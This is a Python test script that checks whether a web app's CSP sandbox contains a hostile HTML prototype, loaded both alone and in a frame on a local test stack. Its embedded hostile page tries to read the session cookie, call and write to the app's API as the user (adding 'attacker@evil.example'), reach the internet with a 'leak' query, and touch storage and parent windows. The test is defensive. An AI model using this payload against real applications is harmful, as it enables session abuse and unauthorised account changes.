"""Test stack only: a prototype the AI was tricked into writing cannot act for the person viewing it.

python -I proto_sandbox_check.py
Signs in a new organisation on the test stack (port 8103), makes a dashboard, puts a hostile prototype in its folder
(it tries the session cookie, the app's API with the person's session, a write to the API, storage, the network and
the top window), then serves it through the app and loads it in headless Chromium inside the test web container:
on its own (as "Open" does) and in a frame of an app page (as the dashboard page does).
"""
import json
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import d2d_checks as c  # noqa: E402

HOSTILE = r"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>x</title></head><body>
<div id="page" style="height:1234px">hostile prototype</div>
<script>
(async () => {
  const r = {};
  try { r.cookie = document.cookie; } catch (e) { r.cookie = 'ERR ' + e.name; }
  try { r.origin = String(window.origin); } catch (e) { r.origin = 'ERR ' + e.name; }
  try { const x = await fetch('/api/me', {credentials: 'include'}); r.api_me = 'status ' + x.status + ' ' + (await x.text()).slice(0, 60); }
  catch (e) { r.api_me = 'ERR ' + e.name; }
  try { const x = await fetch('/api/org/people', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: '{"email":"attacker@evil.example"}'}); r.api_write = 'status ' + x.status; }
  catch (e) { r.api_write = 'ERR ' + e.name; }
  try { const x = await fetch('https://example.com/?leak=1'); r.internet = 'status ' + x.status; } catch (e) { r.internet = 'ERR ' + e.name; }
  try { localStorage.setItem('k', 'v'); r.storage = 'ok'; } catch (e) { r.storage = 'ERR ' + e.name; }
  try { r.top = String(window.top.location.href); } catch (e) { r.top = 'ERR ' + e.name; }
  try { r.parent_doc = String(window.parent.document.cookie); } catch (e) { r.parent_doc = 'ERR ' + e.name; }
  document.body.setAttribute('data-r', JSON.stringify(r));
})();
</script></body></html>"""

PLAY = r"""
import json, sys
from playwright.sync_api import sync_playwright
cookie, pid = sys.argv[1], sys.argv[2]
url = f"http://127.0.0.1:8000/api/projects/{pid}/prototype/live"
out = {}
with sync_playwright() as p:
    b = p.chromium.launch(args=["--no-sandbox"])
    ctx = b.new_context()
    ctx.add_cookies([{"name": "d2d_session", "value": cookie, "url": "http://127.0.0.1:8000"}])
    page = ctx.new_page()
    csp_errors = []
    page.on("console", lambda m: csp_errors.append(m.text[:120]) if "Content Security Policy" in m.text else None)
    page.goto(url)
    page.wait_for_function("document.body && document.body.getAttribute('data-r')", timeout=20000)
    out["alone"] = json.loads(page.evaluate("document.body.getAttribute('data-r')"))
    # in a frame of an app page, as protoFrame shows it
    page.goto("http://127.0.0.1:8000/healthz")
    page.evaluate('''() => new Promise(done => {
        window.heights = [];
        addEventListener('message', e => { if (e.data && typeof e.data.relayPrototypeHeight === 'number') window.heights.push(e.data.relayPrototypeHeight); });
        const f = document.createElement('iframe'); f.setAttribute('sandbox', 'allow-scripts'); f.src = '%s';
        f.onload = () => setTimeout(done, 2500); document.body.appendChild(f); })''' % url.replace("http://127.0.0.1:8000", ""))
    frame = page.frames[1]
    out["framed"] = json.loads(frame.evaluate("document.body.getAttribute('data-r')") or "{}")
    out["framed_heights"] = page.evaluate("window.heights")
    out["app_cookie_still_there"] = any(c["name"] == "d2d_session" for c in ctx.cookies())
    out["csp_console"] = csp_errors[:4]
    b.close()
print(json.dumps(out))
"""


def main():
    stamp = str(int(time.time()))[-6:]
    p = c.Person(f"pia.owner@proto{stamp}.com")
    s, r = p.sign_in("Proto Test")
    c.check("sandbox: a new organisation signs in", s == 200, r)
    s, r = c.new_dashboard(p)
    pid = (r or {}).get("id") if isinstance(r, dict) else None
    c.check("sandbox: a dashboard is made", s == 200 and pid, r)
    folder = subprocess.run(["docker", "exec", c.WEB_C, "sh", "-c", f"find /data/projects -maxdepth 3 -type d -name '{pid}' | head -1"],
                            capture_output=True, text=True).stdout.strip()
    c.check("sandbox: its folder is found", bool(folder), folder)
    subprocess.run(["docker", "exec", "-i", c.WEB_C, "sh", "-c", f"mkdir -p '{folder}/prototype' && cat > '{folder}/prototype/index.html'"],
                   input=HOSTILE, text=True, check=True)
    # the headers, through the app
    req = c.urllib.request.Request(c.BASE + f"/api/projects/{pid}/prototype/live")
    with p.http.open(req, timeout=30) as resp:
        csp, nosniff, body = resp.headers.get("Content-Security-Policy", ""), resp.headers.get("X-Content-Type-Options"), resp.read().decode()
    c.check("sandbox: served with CSP sandbox allow-scripts", csp.startswith("sandbox allow-scripts") and "allow-same-origin" not in csp, csp)
    c.check("sandbox: no network in the CSP (connect-src 'none', default-src 'none')", "connect-src 'none'" in csp and "default-src 'none'" in csp, csp)
    c.check("sandbox: framed by the app only", "frame-ancestors 'self'" in csp, csp)
    c.check("sandbox: nosniff", nosniff == "nosniff", nosniff)
    c.check("sandbox: the height script is added", "relayPrototypeHeight" in body and body.index("relayPrototypeHeight") < body.lower().rindex("</body>"))
    cookie = next(ck.value for ck in p.jar if ck.name == "d2d_session")
    res = subprocess.run(["docker", "exec", "-i", c.WEB_C, "python3", "-", cookie, pid], input=PLAY, capture_output=True, text=True, timeout=180)
    if res.returncode:
        c.check("sandbox: headless Chromium ran", False, res.stderr[-800:])
        return
    out = json.loads(res.stdout.strip().splitlines()[-1])
    print(json.dumps(out, indent=1))
    for where in ("alone", "framed"):
        o = out[where]
        c.check(f"sandbox ({where}): no cookie", o.get("cookie") in ("", None) or str(o.get("cookie")).startswith("ERR"), o.get("cookie"))
        c.check(f"sandbox ({where}): an opaque origin", o.get("origin") == "null", o.get("origin"))
        c.check(f"sandbox ({where}): the app's API is not reachable as the person", str(o.get("api_me")).startswith("ERR"), o.get("api_me"))
        c.check(f"sandbox ({where}): no writes to the app's API", str(o.get("api_write")).startswith("ERR"), o.get("api_write"))
        c.check(f"sandbox ({where}): no internet", str(o.get("internet")).startswith("ERR"), o.get("internet"))
        c.check(f"sandbox ({where}): no storage of the app", str(o.get("storage")).startswith("ERR"), o.get("storage"))
    c.check("sandbox (framed): no access to the app page", str(out["framed"].get("parent_doc")).startswith("ERR"), out["framed"].get("parent_doc"))
    c.check("sandbox (framed): it reports its height to the app page", 1234 in out.get("framed_heights", []) or any(h >= 1234 for h in out.get("framed_heights", [])), out.get("framed_heights"))
    s, r = p.get("/api/org/people")
    people = [x.get("email") for x in (r.get("people") if isinstance(r, dict) else r) or []] if s == 200 else []
    c.check("sandbox: nobody was added to the organisation", "attacker@evil.example" not in people, people)


if __name__ == "__main__":
    main()
    bad = [n for n, ok in c.RESULTS if not ok]
    print(f"\n{len(c.RESULTS) - len(bad)} of {len(c.RESULTS)} checks passed" + (f"; failed: {bad}" if bad else ""))
    sys.exit(len(bad))
